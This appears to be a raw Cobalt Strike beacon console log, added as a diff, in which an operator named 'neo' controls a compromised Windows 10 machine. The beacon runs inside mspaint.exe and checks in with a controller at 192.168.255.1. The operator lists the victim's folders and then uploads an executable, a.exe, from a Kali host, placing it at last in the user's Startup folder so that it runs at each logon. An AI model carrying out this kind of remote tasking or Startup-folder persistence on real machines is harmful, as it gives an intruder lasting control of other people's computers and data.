@@ -1,0 +1,182 @@
+01/04 09:43:02 UTC [metadata] 192.168.255.1 <- 192.168.88.108; computer: DESKTOP-29M090E; user: NITRO 5; process: mspaint.exe; pid: 3512; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+01/04 09:46:18 UTC [metadata] 192.168.255.1 <- 192.168.88.108; computer: DESKTOP-29M090E; user: NITRO 5; process: mspaint.exe; pid: 3512; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+01/04 09:46:39 UTC [input] <neo> ls
+01/04 09:46:39 UTC [task] <> Tasked beacon to list files in .
+01/04 09:47:11 UTC [checkin] host called home, sent: 19 bytes
+01/04 09:47:11 UTC [output]
+C:\Users\NITRO5~1\AppData\Local\Temp\RarSFX6\*
+D	0	01/04/2023 16:41:56	.
+D	0	01/04/2023 16:47:07	..
+F	954368	01/04/2023 16:40:33	a.exe
+F	2319	12/21/2022 17:16:19	Google Chrome.lnk
+
+
+01/04 09:54:43 UTC [input] <neo> cd ..
+01/04 09:54:43 UTC [task] <> cd ..
+01/04 09:54:46 UTC [input] <neo> cd ..
+01/04 09:54:46 UTC [task] <> cd ..
+01/04 09:54:47 UTC [input] <neo> cd ..
+01/04 09:54:47 UTC [task] <> cd ..
+01/04 09:54:48 UTC [input] <neo> cd ..
+01/04 09:54:48 UTC [task] <> cd ..
+01/04 09:54:52 UTC [input] <neo> pwd
+01/04 09:54:52 UTC [task] <> Tasked beacon to print working directory
+01/04 09:55:11 UTC [checkin] host called home, sent: 48 bytes
+01/04 09:55:11 UTC [output]
+Current directory is C:\Users\NITRO5~1
+
+01/04 09:55:30 UTC [input] <neo> ls
+01/04 09:55:30 UTC [task] <> Tasked beacon to list files in .
+01/04 09:56:11 UTC [checkin] host called home, sent: 19 bytes
+01/04 09:56:11 UTC [output]
+C:\Users\NITRO5~1\*
+D	0	12/23/2022 13:52:08	.
+D	0	12/23/2022 14:12:25	..
+F	5777	12/23/2022 09:20:40	-1.14-windows.xml
+D	0	12/23/2022 10:20:45	.android
+D	0	12/21/2022 18:19:02	.dotnet
+D	0	12/23/2022 13:52:08	.templateengine
+D	0	12/22/2022 05:24:32	AppData
+D	0	12/22/2022 05:24:32	Application Data
+D	0	12/22/2022 05:24:41	Contacts
+D	0	12/22/2022 05:24:32	Cookies
+D	0	01/02/2023 20:06:32	Desktop
+D	0	01/04/2023 09:55:10	Documents
+D	0	01/04/2023 15:39:36	Downloads
+D	0	12/22/2022 05:24:41	Favorites
+D	0	01/04/2023 16:30:38	IntelGraphicsProfiles
+D	0	12/22/2022 05:24:41	Links
+D	0	12/22/2022 05:24:32	Local Settings
+D	0	12/22/2022 05:24:41	Music
+D	0	12/22/2022 05:24:32	My Documents
+D	0	12/22/2022 05:24:32	NetHood
+F	7077888	01/04/2023 16:30:08	NTUSER.DAT
+F	851968	12/22/2022 05:24:32	ntuser.dat.LOG1
+F	2076672	12/22/2022 05:24:32	ntuser.dat.LOG2
+F	65536	12/22/2022 05:24:38	NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TM.blf
+F	524288	12/22/2022 05:24:32	NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TMContainer00000000000000000001.regtrans-ms
+F	524288	12/22/2022 05:24:32	NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TMContainer00000000000000000002.regtrans-ms
+F	20	12/22/2022 05:24:32	ntuser.ini
+D	0	12/22/2022 21:59:05	OneDrive
+D	0	12/29/2022 15:15:50	Pictures
+D	0	12/22/2022 05:24:32	PrintHood
+D	0	12/22/2022 05:24:32	Recent
+D	0	12/22/2022 05:24:41	Saved Games
+D	0	12/22/2022 05:26:17	Searches
+D	0	12/22/2022 05:24:32	SendTo
+D	0	12/21/2022 18:36:54	source
+D	0	12/22/2022 05:24:32	Start Menu
+D	0	12/22/2022 05:24:32	Templates
+D	0	12/21/2022 17:06:53	Videos
+
+
+01/04 09:57:09 UTC [input] <neo> cd AppData/Roaming/Microsoft/Windows
+01/04 09:57:09 UTC [task] <> cd AppData/Roaming/Microsoft/Windows
+01/04 09:57:11 UTC [checkin] host called home, sent: 41 bytes
+01/04 09:57:17 UTC [input] <neo> ls
+01/04 09:57:17 UTC [task] <> Tasked beacon to list files in .
+01/04 09:58:11 UTC [checkin] host called home, sent: 19 bytes
+01/04 09:58:11 UTC [output]
+C:\Users\NITRO5~1\AppData\Roaming\Microsoft\Windows\*
+D	0	12/23/2022 09:26:05	.
+D	0	12/22/2022 22:39:19	..
+D	0	12/22/2022 05:24:41	AccountPictures
+D	0	05/07/2022 12:24:50	CloudStore
+D	0	12/23/2022 08:21:07	Hyper-V
+D	0	12/27/2022 14:45:45	Libraries
+D	0	05/07/2022 12:24:50	Network Shortcuts
+D	0	12/23/2022 09:26:05	PowerShell
+D	0	05/07/2022 12:24:50	Printer Shortcuts
+D	0	01/04/2023 16:47:01	Recent
+D	0	12/27/2022 17:02:55	SendTo
+D	0	12/22/2022 05:24:41	Start Menu
+D	0	05/07/2022 12:24:50	Templates
+D	0	01/04/2023 16:30:41	Themes
+
+
+01/04 09:58:18 UTC [input] <neo> cd Start\ Menu\Programs\Startup
+01/04 09:58:18 UTC [task] <> cd Start\ Menu\Programs\Startup
+01/04 09:59:10 UTC [input] <neo> upload a.exe
+01/04 09:59:11 UTC [task] <> Tasked beacon to upload /home/kali/Desktop/CS4.5/a.exe as a.exe
+01/04 09:59:11 UTC [indicator] file: 2949f74ff08c275c1f22c9e0fa0257fa 954368 bytes a.exe
+01/04 09:59:11 UTC [checkin] host called home, sent: 954438 bytes
+01/04 10:00:31 UTC [input] <neo> ls
+01/04 10:00:31 UTC [task] <> Tasked beacon to list files in .
+01/04 10:01:12 UTC [checkin] host called home, sent: 19 bytes
+01/04 10:01:12 UTC [output]
+C:\Users\NITRO5~1\AppData\Roaming\Microsoft\Windows\*
+D	0	01/04/2023 16:59:11	.
+D	0	12/22/2022 22:39:19	..
+F	954368	01/04/2023 16:59:11	a.exe
+D	0	12/22/2022 05:24:41	AccountPictures
+D	0	05/07/2022 12:24:50	CloudStore
+D	0	12/23/2022 08:21:07	Hyper-V
+D	0	12/27/2022 14:45:45	Libraries
+D	0	05/07/2022 12:24:50	Network Shortcuts
+D	0	12/23/2022 09:26:05	PowerShell
+D	0	05/07/2022 12:24:50	Printer Shortcuts
+D	0	01/04/2023 16:47:01	Recent
+D	0	12/27/2022 17:02:55	SendTo
+D	0	12/22/2022 05:24:41	Start Menu
+D	0	05/07/2022 12:24:50	Templates
+D	0	01/04/2023 16:30:41	Themes
+
+
+01/04 10:02:30 UTC [input] <neo> cd Start\ Menu\Programs\Startup
+01/04 10:02:30 UTC [task] <> cd Start\ Menu\Programs\Startup
+01/04 10:03:00 UTC [input] <neo> upload a.exe
+01/04 10:03:01 UTC [task] <> Tasked beacon to upload /home/kali/Desktop/CS4.5/a.exe as a.exe
+01/04 10:03:01 UTC [indicator] file: 2949f74ff08c275c1f22c9e0fa0257fa 954368 bytes a.exe
+01/04 10:03:12 UTC [checkin] host called home, sent: 954438 bytes
+01/04 10:03:18 UTC [input] <neo> ls
+01/04 10:03:18 UTC [task] <> Tasked beacon to list files in .
+01/04 10:04:12 UTC [checkin] host called home, sent: 19 bytes
+01/04 10:04:12 UTC [output]
+C:\Users\NITRO5~1\AppData\Roaming\Microsoft\Windows\*
+D	0	01/04/2023 17:03:29	.
+D	0	12/22/2022 22:39:19	..
+D	0	12/22/2022 05:24:41	AccountPictures
+D	0	05/07/2022 12:24:50	CloudStore
+D	0	12/23/2022 08:21:07	Hyper-V
+D	0	12/27/2022 14:45:45	Libraries
+D	0	05/07/2022 12:24:50	Network Shortcuts
+D	0	12/23/2022 09:26:05	PowerShell
+D	0	05/07/2022 12:24:50	Printer Shortcuts
+D	0	01/04/2023 16:47:01	Recent
+D	0	12/27/2022 17:02:55	SendTo
+D	0	12/22/2022 05:24:41	Start Menu
+D	0	05/07/2022 12:24:50	Templates
+D	0	01/04/2023 16:30:41	Themes
+
+
+01/04 10:04:46 UTC [input] <neo> cd Start/ Menu\Programs\Startup
+01/04 10:04:46 UTC [task] <> cd Start/ Menu\Programs\Startup
+01/04 10:04:48 UTC [input] <neo> ls
+01/04 10:04:48 UTC [task] <> Tasked beacon to list files in .
+01/04 10:05:12 UTC [checkin] host called home, sent: 55 bytes
+01/04 10:05:12 UTC [output]
+C:\Users\NITRO5~1\AppData\Roaming\Microsoft\Windows\*
+D	0	01/04/2023 17:03:29	.
+D	0	12/22/2022 22:39:19	..
+D	0	12/22/2022 05:24:41	AccountPictures
+D	0	05/07/2022 12:24:50	CloudStore
+D	0	12/23/2022 08:21:07	Hyper-V
+D	0	12/27/2022 14:45:45	Libraries
+D	0	05/07/2022 12:24:50	Network Shortcuts
+D	0	12/23/2022 09:26:05	PowerShell
+D	0	05/07/2022 12:24:50	Printer Shortcuts
+D	0	01/04/2023 16:47:01	Recent
+D	0	12/27/2022 17:02:55	SendTo
+D	0	12/22/2022 05:24:41	Start Menu
+D	0	05/07/2022 12:24:50	Templates
+D	0	01/04/2023 16:30:41	Themes
+
+
+01/04 10:06:12 UTC [checkin] host called home, sent: 19 bytes
+01/04 10:07:12 UTC [checkin] host called home, sent: 80 bytes
+01/04 10:08:12 UTC [checkin] host called home, sent: 89 bytes
+01/04 10:09:12 UTC [checkin] host called home, sent: 97 bytes
+01/04 10:09:25 UTC [input] <neo> upload /home/kali/Desktop/CS4.5/a.exe (C:\Users\NITRO5~1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.exe)
+01/04 10:09:26 UTC [task] <> Tasked beacon to upload /home/kali/Desktop/CS4.5/a.exe as C:\Users\NITRO5~1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.exe
+01/04 10:09:26 UTC [indicator] file: 2949f74ff08c275c1f22c9e0fa0257fa 954368 bytes C:\Users\NITRO5~1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.exe
+01/04 10:10:12 UTC [checkin] host called home, sent: 954659 bytes
